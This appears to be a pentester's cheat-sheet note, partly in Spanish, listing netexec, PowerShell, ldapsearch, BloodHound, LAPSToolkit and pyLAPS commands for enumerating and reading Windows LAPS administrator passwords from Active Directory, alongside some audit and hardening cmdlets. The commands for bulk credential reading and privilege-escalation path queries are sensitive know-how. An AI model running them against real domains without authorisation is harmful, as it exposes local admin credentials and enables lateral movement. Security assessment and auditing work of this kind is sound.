---
aliases:
  - LAPS Tooling
  - Get-AdmPwdPassword
  - LAPSToolkit
  - pyLAPS
tags:
  - type/tool
  - vuln/ad-enumeration
  - technique/credential-access
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: Tool
linked:
  - '[[AD - LAPS Enumeration]]'
  - '[[netexec]]'
---
# AD - LAPS Enumeration - Tooling

***

## netexec / crackmapexec

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nxc smb hosts.txt -u u -p p --laps` | Bulk read v1/v2 (auto-detect) | Standard. |
| `nxc ldap <DC> -u u -p p --laps` | LDAP path | SMB blocked. |
| `nxc ldap <DC> -u u -p p --query "(\|(ms-Mcs-AdmPwd=*)(msLAPS-Password=*))" "samAccountName,ms-Mcs-AdmPwd,msLAPS-Password"` | Custom LDAP filter | Targeted. |
| `nxc smb <DC> -u '' -p '' --laps` | Anonymous attempt | Rare misconfig. |
^ad-laps-tool-netexec

___

## PowerShell Native LAPS

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Import-Module AdmPwd.PS` | Carga LAPSv1 module | Pre-cmdlet. |
| `Get-AdmPwdPassword -ComputerName <host>` | LAPSv1 read | Native v1. |
| `Reset-AdmPwdPassword -ComputerName <host>` | Force rotation v1 | Cleanup. |
| `Find-AdmPwdExtendedRights -Identity <OU>` | Per-OU readers v1 | Audit. |
| `Set-AdmPwdReadPasswordPermission -Identity <OU> -AllowedPrincipals <Group>` | Grant read v1 | Hardening. |
| `Import-Module LAPS` | Carga LAPSv2 module (Win11/Server 2019+) | Pre-cmdlet. |
| `Get-LapsADPassword <host> -AsPlainText` | LAPSv2 read + decrypt | Native v2. |
| `Get-LapsADPassword <host> -IncludeHistory` | + password history | Forensics. |
| `Reset-LapsPassword -Identity <host>` | Force rotation v2 | Cleanup. |
| `Find-LapsADExtendedRights -Identity <OU>` | Per-OU readers v2 | Audit. |
| `Set-LapsADComputerSelfPermission -Identity <OU>` | Self-write setup | Deploy. |
^ad-laps-tool-pwsh

___

## ldapsearch / Linux LDAP

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `ldapsearch -h <DC> -D 'corp\u' -w pass -b "DC=corp,DC=local" "(ms-Mcs-AdmPwd=*)" samAccountName ms-Mcs-AdmPwd` | LAPSv1 bulk readable | Linux. |
| `ldapsearch ... "(msLAPS-Password=*)" samAccountName msLAPS-Password` | LAPSv2 cleartext | Si encryption disabled. |
| `ldapsearch ... "(msLAPS-EncryptedPassword=*)" samAccountName msLAPS-EncryptedPassword` | Encrypted blobs | Modern. |
| `ldapsearch ... -b "CN=Schema,..." "(\|(name=ms-Mcs-AdmPwd*)(name=msLAPS-*))"` | Schema check | Detection. |
^ad-laps-tool-ldapsearch

___

## BloodHound LAPS

| **Cypher / Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `MATCH (c:Computer {haslaps:true}) RETURN c.name,c.domain` | Computers con LAPS deployed | Coverage. |
| `MATCH (u {owned:true})-[:ReadLAPSPassword*1..]->(c:Computer) RETURN u.name,c.name` | Paths owned → LAPS read | Privesc. |
| `MATCH (u:User)-[:MemberOf*1..]->(g:Group)-[:ReadLAPSPassword]->(c:Computer) RETURN u.name,g.name,c.name` | Recursive readers | Detail. |
| `MATCH (c:Computer) WHERE NOT c.haslaps AND c.enabled RETURN c.name` | Coverage gaps | Audit. |
| `.\SharpHound.exe -c All --LdapFilter "(haslaps=*)"` | Custom collection | Targeted. |
| `bloodhound-python -d corp.local -u u -p p -ns <DC> -c All --zip` | Linux collection con LAPS | Standard. |
^ad-laps-tool-bh

___

## LAPSToolkit (Community)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-LAPSComputers` | Lista computers con LAPS deployed | Inventory. |
| `Get-LAPSComputers -Domain corp.local` | Specific domain | Cross-domain. |
| `Find-LAPSDelegatedGroups` | Groups con read delegation | Audit. |
| `Find-LAPSExtendedRights` | Per-OU readers | Audit. |
| `Get-LAPSCustomFunctions` | Custom helpers | Edge. |
^ad-laps-tool-laptoolkit

```powershell
# Install LAPSToolkit
git clone https://github.com/leoloobeek/LAPSToolkit
Import-Module .\LAPSToolkit\LAPSToolkit.ps1

Get-LAPSComputers
Find-LAPSDelegatedGroups
Find-LAPSExtendedRights
```

___

## Impacket / Linux Helpers

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `pyLAPS.py -d corp.local -u u -p pass --action get -c <host>` | LAPSv1 read Linux | Sin nxc. |
| `pyLAPS.py -d corp.local -u u -p pass --action get-all` | Bulk read v1 | Linux. |
| `python3 LAPS-Reader.py -d corp.local -u u -p pass --dc-ip <DC>` | Alt v1 reader | Sin nxc. |
| `bloodyAD --host <DC> -d corp -u u -p pass get object <computer-DN> --attr ms-Mcs-AdmPwd` | Quick attr read | Linux. |
| `impacket-getlaps` (no oficial) | Custom Impacket scripts | Edge. |
^ad-laps-tool-impacket

```bash
git clone https://github.com/p0dalirius/pyLAPS
python3 pyLAPS/pyLAPS.py -d corp.local -u auditor -p 'Pass!' --action get-all --dc-ip <DC>
```

___

## Recursos

| **Recurso** | **URL** |
|:---:|:---:|
| Microsoft Windows LAPS docs | `https://learn.microsoft.com/windows-server/identity/laps/laps-overview` |
| Microsoft LAPS legacy docs (v1) | `https://www.microsoft.com/download/details.aspx?id=46899` |
| LAPSToolkit | `https://github.com/leoloobeek/LAPSToolkit` |
| pyLAPS | `https://github.com/p0dalirius/pyLAPS` |
| HackTricks LAPS | `https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps` |
| The Hacker Recipes — LAPS | `https://www.thehacker.recipes/ad/movement/credentials/dumping/laps` |
| Microsoft LAPS migration guide | `https://learn.microsoft.com/windows-server/identity/laps/laps-scenarios-windows-server-active-directory` |
| MITRE ATT&CK T1555.005 | `https://attack.mitre.org/techniques/T1555/005/` |
^ad-laps-tool-resources

***
